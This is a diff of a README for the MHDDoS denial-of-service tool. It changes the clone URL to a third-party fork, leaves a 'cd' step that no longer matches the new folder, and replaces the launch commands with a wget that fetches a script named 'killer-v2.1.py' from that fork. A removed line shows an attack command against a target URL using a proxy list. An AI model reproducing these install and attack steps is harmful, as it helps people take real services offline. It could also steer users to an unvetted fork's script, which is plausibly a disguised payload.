@@ -70,32 +70,20 @@ You can download from [GitHub Releases](https://github.com/MHProDev/MHDDoS/relea
 * scapy
 ---
 
-**Video's**
-
-* Aparat: https://www.aparat.com/v/bHcP9
-* YouTube : Coming soon..
-
-**toturial**
-
-* Aprat : https://aparat.com/v/XPn5Z
-* YouTube : https://youtu.be/sPiccjgCbqUg
----
-
 **Clone and Install Script**
 
 ```console
-git clone https://github.com/MHProDev/MHDDoS.git
+git clone https://github.com/BreadIsPan/MH-DDOS 
 cd MHDDoS
 pip3 install -r requirements.txt
 ```
 
 ---
 
-**Launch Script**
+**UPDATE Script**
 
 ```console
-python3 start.py
-python3 start.py bypass https://example.com 5 1000 socks5.txt 100 100
+wget https://github.com/BreadIsPan/MH-DDOS/raw/main/killer-v2.1.py
 ```
 
 [python3]: https://python.org 'Python3'
